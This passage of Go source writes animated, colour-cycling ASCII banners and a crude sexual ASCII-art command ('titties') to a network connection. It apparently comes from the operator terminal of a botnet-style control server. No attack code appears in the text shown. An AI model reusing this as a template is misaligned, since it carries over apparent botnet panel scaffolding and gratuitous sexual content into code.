			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[31m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[31m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[32m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[32m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[33m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[33m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[34m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[34m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[35m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗╔═╗╦ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m│└┘ ║ ╦║║║║╣  ║  ╠╦╝╔═╝╚╦╝\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[35m└── ╚═╝╩ ╩╚═╝o╚═╝╩╚═╚═╝ ╩ \x1b[0m\r\n"))
			continue
        }
        if cmd == "titties" {
                            this.conn.Write([]byte("\033[38;5;236m  88  M\033[38;5;216m::::::::::\033[38;5;236m8888M::88888::888888\033[38;5;236m888888:\033[38;5;216m::::::Mm88888                    \r\n"))
                this.conn.Write([]byte("\033[38;5;236m8   MM\033[38;5;216m::::::::\033[38;5;236m8888\033[38;5;216mM:::\033[38;5;236m8888\033[38;5;216m:::::\033[38;5;236m888888888888::\033[38;5;216m::::::Mm8                       \r\n"))
                this.conn.Write([]byte("\033[38;5;236m    8M\033[38;5;216m:::::::\033[38;5;236m8888\033[38;5;216mM:::::\033[38;5;236m888\033[38;5;216m:::::::\033[38;5;236m88\033[38;5;216m:::\033[38;5;236m8888888\033[38;5;216m::::::::Mm                      \r\n"))
                this.conn.Write([]byte("\033[38;5;236m   88MM\033[38;5;216m:::::\033[38;5;236m8888\033[38;5;216mM:::::::\033[38;5;236m88\033[38;5;216m::::::::\033[38;5;236m8\033[38;5;216m:::::\033[38;5;236m888888\033[38;5;216m:::M:::::M                     \r\n"))
                this.conn.Write([]byte("\033[38;5;236m  8888M\033[38;5;216m:::::\033[38;5;236m888\033[38;5;216mMM::::::::\033[38;5;236m8\033[38;5;216m:::::::::::M::::\033[38;5;236m8888\033[38;5;216m::::M::::M                     \r\n"))
                this.conn.Write([]byte("\033[38;5;236m 88888m\033[38;5;216m:::::\033[38;5;236m88\033[38;5;216m:M::::::::::\033[38;5;236m8\033[38;5;216m:::::::::::M:::\033[38;5;236m8888\033[38;5;216m::::::M::M                     \r\n"))
                this.conn.Write([]byte("\033[38;5;236m88 888MM\033[38;5;216m:::\033[38;5;236m888\033[38;5;216m:M:::::::::::::::::::::::M:\033[38;5;236m8888\033[38;5;216m:::::::::M:                     \r\n"))
                this.conn.Write([]byte("\033[38;5;236m8 88888M\033[38;5;216m:::\033[38;5;236m88\033[38;5;216m::M:::::::::::::::::::::::MM:\033[38;5;236m88\033[38;5;216m::::::::::::M                    \r\n"))
                this.conn.Write([]byte("\033[38;5;236m  88888M\033[38;5;216m:::\033[38;5;236m88\033[38;5;216m::M::::::::::\033[38;5;168m*88*\033[38;5;216m::::::::::M:\033[38;5;236m88\033[38;5;216m::::::::::::::M  \r\n"))
                this.conn.Write([]byte("\033[38;5;236m 888888M\033[38;5;216m:::\033[38;5;236m88\033[38;5;216m::M:::::::::\033[38;5;168m88@@88\033[38;5;216m:::::::::M::\033[38;5;236m88\033[38;5;216m::::::::::::::M \r\n"))
                this.conn.Write([]byte("\033[38;5;236m 888888MM\033[38;5;216m::\033[38;5;236m88\033[38;5;216m::MM::::::::\033[38;5;168m88@@88\033[38;5;216m:::::::::M:::\033[38;5;236m8\033[38;5;216m::::::::::::::*8\r\n"))
                this.conn.Write([]byte("\033[38;5;236m 88888  \033[38;5;216mM:::\033[38;5;236m8\033[38;5;216m::MM:::::::::\033[38;5;168m*88*\033[38;5;216m::::::::::M:::::::::::::::::\033[38;5;168m88@@\r\n"))
                this.conn.Write([]byte("\033[38;5;236m 8888  \033[38;5;216m MM::::::MM:::::::::::::::::::::MM:::::::::::::::::\033[38;5;168m88@@       \r\n"))
                this.conn.Write([]byte("\033[38;5;236m  888  \033[38;5;216m  M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8                \r\n"))
                this.conn.Write([]byte("\033[38;5;236m   888  \033[38;5;216m  MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M                \r\n"))
                this.conn.Write([]byte("\033[38;5;236m    88  \033[38;5;216m   M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM                 \r\n"))
                this.conn.Write([]byte("\033[38;5;236m     88  \033[38;5;216m  MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM                  \r\n"))
                this.conn.Write([]byte("\033[38;5;236m      88  \033[38;5;216m  MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM                    \r\n"))
                this.conn.Write([]byte("\033[38;5;236m       88  \033[38;5;216m 8MM::::::::::::::::::::::::::::::::::MMMMMM                      \r\n"))
